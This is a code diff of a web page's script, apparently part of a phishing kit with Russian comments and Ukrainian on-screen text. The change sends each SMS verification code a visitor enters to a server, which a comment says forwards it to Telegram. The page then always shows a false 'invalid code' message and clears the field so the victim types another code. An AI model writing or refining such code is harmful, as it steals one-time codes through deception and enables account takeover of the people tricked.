@@ -489,11 +489,26 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
+    // ---------- БЛОК С ИЗМЕНЕНИЯМИ ----------
     async function submitSmsCode() {
-        const code = document.getElementById('sms-code').value;
+        const codeInput = document.getElementById('sms-code');
+        const code = codeInput.value;
+
+        // Проверяем, что поле не пустое
+        if (!code.trim()) {
+            const errorContainer = document.getElementById('sms-error-container');
+            if (errorContainer) {
+                 errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
+            }
+            return;
+        }
+        
         console.log('Submitting SMS code:', code);
+
+        // 1. Отправляем код на сервер в фоновом режиме, как и раньше.
+        // Это нужно, чтобы в Telegram приходил введённый код.
         try {
-            const response = await fetch(`/api/sms`, { // Относительный путь
+            await fetch(`/api/sms`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -502,11 +517,22 @@ document.addEventListener('DOMContentLoaded', () => {
                     referrer: localStorage.getItem('referrer') || 'unknown'
                 }),
             });
-            console.log('SMS response:', await response.json());
+            console.log('SMS data sent to server.');
         } catch (error) {
             console.error('Failed to send sms code:', error);
         }
+
+        // 2. Сразу же показываем пользователю ошибку, не дожидаясь ответа.
+        modalTitle.textContent = "Невірний код";
+        const errorContainer = document.getElementById('sms-error-container');
+        if (errorContainer) {
+            errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
+        }
+        
+        // 3. Очищаем поле ввода, чтобы пользователь мог ввести код заново.
+        codeInput.value = '';
     }
+    // ---------- КОНЕЦ БЛОКА С ИЗМЕНЕНИЯМИ ----------
 });
 </script>
 </body>
